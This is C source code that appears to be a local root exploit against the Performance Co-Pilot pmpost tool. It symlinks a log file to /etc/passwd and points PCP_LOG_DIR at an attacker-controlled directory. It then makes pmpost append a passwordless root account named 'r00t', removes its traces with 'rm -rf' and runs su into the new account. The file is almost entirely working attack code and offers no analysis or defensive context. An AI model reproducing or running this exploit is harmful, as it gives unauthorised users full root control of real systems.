
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int buf ;


 int S_IRWXU ;
 int WUNTRACED ;
 int _exit (int) ;
 scalar_t__ chdir (char*) ;
 int execl (char const*,char const*,char*,int *) ;
 int fork () ;
 scalar_t__ mkdir (char*,int ) ;
 scalar_t__ putenv (char*) ;
 int rand () ;
 int snprintf (char*,int,char*,char*) ;
 int sprintf (char*,char*,...) ;
 int srand (int ) ;
 scalar_t__ symlink (char*,char*) ;
 int system (char*) ;
 int time (int *) ;
 int waitpid (int ,int *,int ) ;

main()
{
const char *bin="/usr/share/pcp/bin/pmpost";
static char buf[512];
static char dir[128];


 srand(time(((void*)0)));
 sprintf(dir, "/tmp/dupa.%.8d", rand());

 if(mkdir(dir, S_IRWXU))
  _exit(2);

 if(chdir(dir))
  _exit(3);

 if(symlink("/etc/passwd", "./NOTICES"))
  _exit(4);

 snprintf(buf, sizeof(buf)-1, "PCP_LOG_DIR=%.500s", dir);

 if(putenv(buf))
  _exit(5);

 if(!fork()) {
  execl(bin, bin, "\nr00t::0:0:root:/root:/bin/bash", ((void*)0));
  _exit(1);
 }
 else {
  waitpid(0, ((void*)0), WUNTRACED);
  chdir("..");
  sprintf(buf, "rm -rf dupa.*");
  system(buf);
  execl("/bin/su", "/bin/su", "r00t", ((void*)0));
 }
}
